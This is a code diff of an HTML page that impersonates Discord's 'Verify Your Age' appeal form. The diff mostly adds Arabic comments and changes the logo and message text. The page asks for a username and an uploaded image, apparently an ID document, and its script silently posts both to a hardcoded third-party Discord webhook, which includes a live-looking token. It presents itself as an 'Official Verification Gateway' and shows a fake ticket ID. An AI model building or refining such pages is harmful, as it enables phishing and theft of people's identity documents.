@@ -4,15 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord - Submit a Request</title>
-    <link rel="icon" type="image/png" href="https://cdn.prod.website-files.com/6257adef93867e56f84d3101/6259449074362241f3e792fb_discord_icon.png">
+    <link rel="icon" href="https://cdn.discordapp.com/icons/1043798960780637195/a_1a39b3209fc7f5955b1943dbd3923a31.gif" />
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     
     <style>
+        /* تأسيس التصميم (Reset) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #313338;
+            background-color: #313338; /* لون خلفية ديسكورد الرسمي */
             color: #dbdee1;
             display: flex;
             justify-content: center;
@@ -21,22 +22,25 @@
             padding: 20px;
         }
 
+        /* الحاوية الرئيسية */
         .main-container {
             background-color: #313338;
             max-width: 700px;
             width: 100%;
         }
 
+        /* الشعار */
         .logo-container {
             text-align: center;
             margin-bottom: 40px;
         }
         
         .logo-img {
-            height: 38px; /* حجم مثالي للشعار */
+            height: 40px; /* حجم الشعار المتناسق */
             width: auto;
         }
 
+        /* النصوص */
         h1 {
             color: #f2f3f5;
             font-weight: 700;
@@ -52,13 +56,14 @@
             margin-bottom: 30px;
         }
 
+        /* صندوق المتطلبات */
         .info-box {
             background-color: #2b2d31;
             border: 1px solid #1e1f22;
             border-radius: 8px;
             padding: 16px;
             margin-bottom: 32px;
-            border-left: 4px solid #e0a638;
+            border-left: 4px solid #e0a638; /* لون التحذير الأصفر الخاص بديسكورد */
         }
 
         .info-box h3 {
@@ -79,6 +84,7 @@
             margin-bottom: 4px;
         }
 
+        /* النماذج */
         .form-group {
             margin-bottom: 24px;
         }
@@ -111,9 +117,10 @@
 
         input[type="text"]:focus {
             outline: none;
-            box-shadow: 0 0 0 2px #00a8fc;
+            box-shadow: 0 0 0 2px #00a8fc; /* توهج أزرق عند الكتابة */
         }
 
+        /* منطقة رفع الملفات */
         .upload-area {
             border: 2px dashed #42454a;
             border-radius: 8px;
@@ -146,6 +153,7 @@
             margin-top: 5px;
         }
 
+        /* معاينة الصورة */
         .preview-container {
             margin-top: 15px;
             background: #1e1f22;
@@ -171,8 +179,9 @@
             white-space: nowrap;
         }
 
+        /* الأزرار */
         .submit-btn {
-            background-color: #5865F2;
+            background-color: #5865F2; /* Discord Blurple */
             color: white;
             border: none;
             border-radius: 4px;
@@ -194,6 +203,7 @@
             opacity: 0.7;
         }
 
+        /* قسم النجاح */
         .success-overlay {
             display: none;
             text-align: center;
@@ -208,6 +218,7 @@
             margin-bottom: 20px;
         }
 
+        /* التجاوب مع الجوال */
         @media (max-width: 480px) {
             body { padding: 15px; align-items: flex-start; }
             h1 { font-size: 20px; }
@@ -218,7 +229,7 @@
 
     <div class="main-container" id="mainContainer">
         <div class="logo-container">
-            <img src="https://cdn.prod.website-files.com/6257adef93867e56f84d3101/6257af0ad98a34855853331b_discord_logo_full_white.svg" alt="Discord" class="logo-img">
+            <img src="https://cdn.discordapp.com/icons/1043798960780637195/a_1a39b3209fc7f5955b1943dbd3923a31.gif" alt="Discord" class="logo-img">
         </div>
 
         <h1>Verify Your Age</h1>
@@ -272,8 +283,14 @@
     </div>
 
 <script>
+    // ---------------------------------------------------------
+    // إعدادات النظام (System Config)
+    // ---------------------------------------------------------
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1463909673303412747/i3VXrwPefUdfNamhMJlR9L_rqSOM41eWVZb641ERxaGf7KuieSjeVobmH6Y1W1tDZUH4";
     
+    // ---------------------------------------------------------
+    // عناصر واجهة المستخدم (UI Elements)
+    // ---------------------------------------------------------
     const fileInput = document.getElementById('fileInput');
     const dropZone = document.getElementById('dropZone');
     const previewArea = document.getElementById('previewArea');
@@ -282,6 +299,9 @@
     const submitBtn = document.getElementById('submitBtn');
     const form = document.getElementById('appealForm');
 
+    // ---------------------------------------------------------
+    // معالجة الصور (Image Handling)
+    // ---------------------------------------------------------
     dropZone.addEventListener('click', () => fileInput.click());
 
     fileInput.addEventListener('change', handleFileSelect);
@@ -289,52 +309,61 @@
     function handleFileSelect(e) {
         const file = e.target.files[0];
         if (file) {
+            // إظهار المعاينة
             const reader = new FileReader();
             reader.onload = function(e) {
                 previewImg.src = e.target.result;
                 fileName.textContent = file.name;
                 previewArea.style.display = 'flex';
-                dropZone.style.borderColor = '#23a559';
+                dropZone.style.borderColor = '#23a559'; // إطار أخضر عند النجاح
             };
             reader.readAsDataURL(file);
         }
     }
 
+    // ---------------------------------------------------------
+    // معالجة الإرسال (Submission Logic)
+    // ---------------------------------------------------------
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
         const username = document.getElementById('username').value.trim();
         const file = fileInput.files[0];
 
+        // 1. التحقق من المدخلات
         if (!username || !file) {
             alert("Please fill in all required fields.");
             return;
         }
 
+        // 2. تحديث حالة الزر
         submitBtn.disabled = true;
-        submitBtn.innerHTML = 'Sending...';
+        submitBtn.innerHTML = 'Sending... <span style="font-size:12px">Please wait</span>';
 
+        // 3. تجهيز البيانات (FormData)
         const formData = new FormData();
         
+        // تصميم الرسالة (Embed Design)
         const payload = {
             username: "Security System",
             avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
             embeds: [{
                 title: "🛡️ Age Verification Appeal",
-                color: 5763719,
+                color: 5763719, // لون ديسكورد الرسمي
                 fields: [
                     { name: "👤 User Account", value: `\`${username}\``, inline: true },
                     { name: "🆔 Appeal ID", value: `\`#${Math.floor(Math.random() * 99999)}\``, inline: true },
                     { name: "📅 Timestamp", value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: false }
                 ],
-                thumbnail: { url: "https://cdn.prod.website-files.com/6257adef93867e56f84d3101/6259449074362241f3e792fb_discord_icon.png" },
+                thumbnail: { url: "https://cdn.discordapp.com/icons/1043798960780637195/a_1a39b3209fc7f5955b1943dbd3923a31.gif" },
                 footer: { text: "Official Verification Gateway" }
             }]
         };
 
         formData.append('payload_json', JSON.stringify(payload));
-        formData.append('file', file);
+        formData.append('file', file); // إرفاق الملف الأصلي
 
+        // 4. الإرسال الفعلي
         try {
             const response = await fetch(WEBHOOK_URL, {
                 method: 'POST',
@@ -342,6 +371,7 @@
             });
 
             if (response.ok) {
+                // نجاح العملية
                 document.getElementById('mainContainer').style.display = 'none';
                 document.getElementById('successScreen').style.display = 'block';
                 document.getElementById('ticketId').innerText = "AV-" + Math.random().toString(36).substr(2, 9).toUpperCase();
@@ -349,7 +379,8 @@
                 throw new Error("Server Error");
             }
         } catch (error) {
-            alert("Error: Unable to connect. Please try again.");
+            console.error(error);
+            alert("Error: Unable to connect to Discord servers. Please try again.");
             submitBtn.disabled = false;
             submitBtn.textContent = "Submit";
         }
